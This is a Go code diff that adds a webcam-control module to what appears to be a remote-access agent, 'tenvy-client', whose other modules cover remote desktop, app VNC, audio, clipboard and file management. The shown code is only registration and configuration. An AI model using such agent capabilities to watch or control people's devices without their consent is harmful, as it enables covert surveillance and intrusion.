@@ -15,6 +15,7 @@ import (
 	appvnc "github.com/rootbay/tenvy-client/internal/modules/control/appvnc"
 	audioctrl "github.com/rootbay/tenvy-client/internal/modules/control/audio"
 	remotedesktop "github.com/rootbay/tenvy-client/internal/modules/control/remotedesktop"
+	webcamctrl "github.com/rootbay/tenvy-client/internal/modules/control/webcam"
 	clipboard "github.com/rootbay/tenvy-client/internal/modules/management/clipboard"
 	filemanager "github.com/rootbay/tenvy-client/internal/modules/management/filemanager"
 	tcpconnections "github.com/rootbay/tenvy-client/internal/modules/management/tcpconnections"
@@ -136,6 +137,7 @@ func newDefaultModuleManager() *moduleManager {
 	registry.register(&appVncModule{})
 	registry.register(newRemoteDesktopModule(nil))
 	registry.register(&audioModule{})
+	registry.register(&webcamModule{})
 	registry.register(&clipboardModule{})
 	registry.register(&fileManagerModule{})
 	registry.register(&tcpConnectionsModule{})
@@ -624,6 +626,68 @@ func defaultRemoteDesktopEngineFactory(ctx context.Context, runtime ModuleRuntim
 type audioModule struct {
 	bridge *audioctrl.AudioBridge
 }
+
+type webcamModule struct {
+	manager *webcamctrl.Manager
+}
+
+func (m *webcamModule) Metadata() ModuleMetadata {
+	return ModuleMetadata{
+		ID:          "webcam-control",
+		Title:       "Webcam Control",
+		Description: "Enumerate and control remote webcam devices.",
+		Commands:    []string{"webcam-control"},
+		Capabilities: []ModuleCapability{
+			{
+				Name:        "webcam.enumerate",
+				Description: "Enumerate connected webcam devices and capabilities.",
+			},
+			{
+				Name:        "webcam.stream",
+				Description: "Initiate webcam streaming sessions when supported.",
+			},
+		},
+	}
+}
+
+func (m *webcamModule) Init(ctx context.Context, runtime ModuleRuntime) error {
+	return m.configure(runtime)
+}
+
+func (m *webcamModule) UpdateConfig(ctx context.Context, runtime ModuleRuntime) error {
+	return m.configure(runtime)
+}
+
+func (m *webcamModule) configure(runtime ModuleRuntime) error {
+	cfg := webcamctrl.Config{
+		AgentID:   runtime.AgentID,
+		BaseURL:   runtime.BaseURL,
+		AuthKey:   runtime.AuthKey,
+		Client:    runtime.HTTPClient,
+		Logger:    runtime.Logger,
+		UserAgent: runtime.UserAgent,
+	}
+	if m.manager == nil {
+		m.manager = webcamctrl.NewManager(cfg)
+		return nil
+	}
+	m.manager.UpdateConfig(cfg)
+	return nil
+}
+
+func (m *webcamModule) Handle(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
+	if m.manager == nil {
+		return protocol.CommandResult{
+			CommandID:   cmd.ID,
+			Success:     false,
+			Error:       "webcam subsystem not initialized",
+			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
+		}
+	}
+	return m.manager.HandleCommand(ctx, cmd)
+}
+
+func (m *webcamModule) Shutdown(context.Context) {}
 
 func (m *audioModule) Metadata() ModuleMetadata {
 	return ModuleMetadata{
